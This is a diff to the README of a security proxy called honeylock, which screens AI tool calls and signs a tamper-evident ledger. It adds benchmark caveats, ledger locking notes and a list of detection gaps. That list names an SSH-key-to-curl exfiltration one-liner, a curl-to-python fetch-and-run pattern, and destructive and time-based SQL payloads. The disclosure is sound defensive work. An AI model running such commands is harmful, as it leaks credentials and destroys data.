@@ -65,14 +65,16 @@ The ledger key is read from `HONEYLOCK_LEDGER_KEY`, or generated once at `~/.hon
 | `secret-egress` | high-entropy value passed to an egress-capable tool | block |
 | `policy` | tool outside the allowlist, denied argument key, oversized payload | block |
 
-Quoting is normalised before matching, percent-encoding is decoded up to three layers, SQL comments are stripped, and base64/hex layers are decoded once or twice, so the obvious obfuscations do not work.
+Quoting is normalised before matching, percent-encoding is decoded up to three layers (in paths and in secrets), SQL is split into code and comments with string quoting respected, and base64 layers are decoded up to three levels, so the obvious obfuscations do not work. File URLs and `~` / `$HOME` paths are resolved before the containment check.
 
 ## Measured, not claimed
 
-23 adversarial and benign vectors, Linux arm64, Node 24.21, 500 iterations each after warm-up. `honeylock benchmark` reproduces this.
+33 adversarial and benign vectors (8 of them benign, to catch over-blocking). `honeylock benchmark` reproduces the verdict check, and the test suite runs the same file.
+
+The latency figures below are from v0.1.0: the first 23 vectors, Linux arm64, Node 24.21, 500 iterations each after warm-up. v0.1.1 added a file lock to ledger appends. On Linux x64 with Node 22 the ledger append p50 went from about 8.5 µs to about 18 µs (three runs each), while the pipeline difference stayed inside run-to-run noise. Re-measure on your own hardware with `honeylock benchmark --bench-ledger <file>` before quoting any of these.
 
 ```
-23/23 vectors matched the expected verdict
+23/23 vectors matched the expected verdict (v0.1.0 run)
 
   collect args  p50 0.21 µs   p99 0.96 µs
   detectors     p50 2.67 µs   p99 37.71 µs
@@ -111,7 +113,11 @@ Trust on first use is a real limitation: if the server was already malicious the
 
 Every decision is appended as JSONL and signed with `HMAC-SHA256(key, seq ‖ ts ‖ type ‖ data ‖ prevHash)`. `honeylock verify` recomputes the chain and reports the first event that does not check out.
 
-Edits, reordering, gaps and truncation are caught. So is a chain re-signed with a different key.
+Edits, reordering, inserted lines and gaps in the middle are caught. So is a chain re-signed with a different key.
+
+Deleting lines from the **end** of the file is not caught by the chain alone: the shorter chain is still valid. Store the head hash somewhere you do not control (`honeylock verify` prints the event count and the first 16 characters of the head; `tail -1 ledger.jsonl | jq -r .hmac` gives all of it) and compare.
+
+Several proxies can append to the same ledger. Each append takes a short-lived lock file (`ledger.jsonl.lock`) and continues from the real tail, so wrapping several servers from one folder keeps a single verifiable chain.
 
 This is tamper **evident**, not tamper proof. Someone who can rewrite the file *and* read the key can produce a consistent history. Keep the key off the machine that writes the ledger, or export the head hash somewhere you do not control.
 
@@ -136,11 +142,13 @@ Read this before trusting it.
 - **No HTTP/SSE transport yet.** Streamable HTTP brings origin validation, session rewriting, resumability and token handling. None of that is here.
 - **No interactive approver yet.** A `review` verdict is denied by default. `--on-review allow` exists for setups that would rather log than block; it is not a good default.
 - **No canary tokens yet.** Planned for v0.2, with HMAC identifiers and a distinction between an echo inside the context and a real boundary crossing.
+- **Shell detection is a short list of known-dangerous shapes.** It does not parse pipelines. `cat ~/.ssh/id_rsa | curl -d @- host`, `python3 -c` one-liners, `$IFS` tricks and `curl … | python3` are not caught today.
+- **SQL detection is shape-based.** `DELETE … WHERE 1=1`, time-based payloads such as `SLEEP(10)` and secrets split across two arguments are not caught. A destructive statement found inside a SQL comment is a `review`, which is denied by default, so commented-out SQL can be refused.
 - **Heuristics, not proofs.** A determined attacker who knows these rules can phrase around them. The value is catching the common shapes and leaving evidence, not achieving immunity. Treat every claim of "100% detection" with suspicion, including your own.
-- **Path checks are string based.** Containment uses a prefix comparison on the resolved path, so a case-insensitive filesystem can produce a false negative. Symlink resolution only runs for paths that exist.
+- **Path checks are string based.** Containment uses a prefix comparison on the resolved path, so a case-insensitive filesystem can produce a false negative. Symlinks are resolved through the deepest ancestor that exists.
 - **Tools that were never listed are not pinned.** The proxy blocks changed and added tools it has seen; it cannot pin what no server ever announced.
 - **The proxy cannot stop exfiltration that does not use a tool call**, such as a secret written into the model's final answer.
-- **Ledger appends are not fsynced**, so a crash can lose the tail. `verify` will then report a gap, which is the intended behaviour.
+- **Ledger appends are not fsynced**, so a crash can lose the tail. `verify` will not report that as a gap: the shorter chain is still valid, and only a head hash stored elsewhere exposes the loss.
 
 ## Threat model
 
